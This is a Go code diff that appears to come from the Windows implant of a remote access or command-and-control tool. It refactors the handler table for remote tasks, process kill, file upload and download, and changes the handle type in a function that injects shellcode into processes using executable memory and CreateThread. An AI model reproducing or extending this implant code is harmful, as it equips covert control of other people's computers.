@@ -11,16 +11,16 @@ import (
 
 var (
 	windowsHandlers = map[string]interface{}{
-		"task":        taskHandler,
-		"remoteTask":  remoteTaskHandler,
-		"psReq":       psHandler,
-		"ping":        pingHandler,
-		"kill":        killHandler,
-		"dirListReq":  dirListHandler,
-		"downloadReq": downloadHandler,
-		"uploadReq":   uploadHandler,
-		"cdReq":       cdHandler,
-		"pwdReq":      pwdHandler,
+		pb.MsgTask:        taskHandler,
+		pb.MsgRemoteTask:  remoteTaskHandler,
+		pb.MsgPsListReq:   psHandler,
+		pb.MsgPing:        pingHandler,
+		pb.MsgKill:        killHandler,
+		pb.MsgDirListReq:  dirListHandler,
+		pb.MsgDownloadReq: downloadHandler,
+		pb.MsgUploadReq:   uploadHandler,
+		pb.MsgCdReq:       cdHandler,
+		pb.MsgPwdReq:      pwdHandler,
 	}
 )
 
@@ -76,8 +76,6 @@ var (
 	createThread       = kernel32.MustFindProc("CreateThread")
 )
 
-type Handle uintptr
-
 func sysAlloc(size int) (uintptr, error) {
 	n := uintptr(size)
 	addr, _, err := virtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
@@ -99,7 +97,7 @@ func ptr(val interface{}) uintptr {
 }
 
 // injectTask - Injects shellcode into a process handle
-func injectTask(processHandle Handle, data []byte) error {
+func injectTask(processHandle syscall.Handle, data []byte) error {
 
 	// Create native buffer with the shellcode
 	dataSize := len(data)
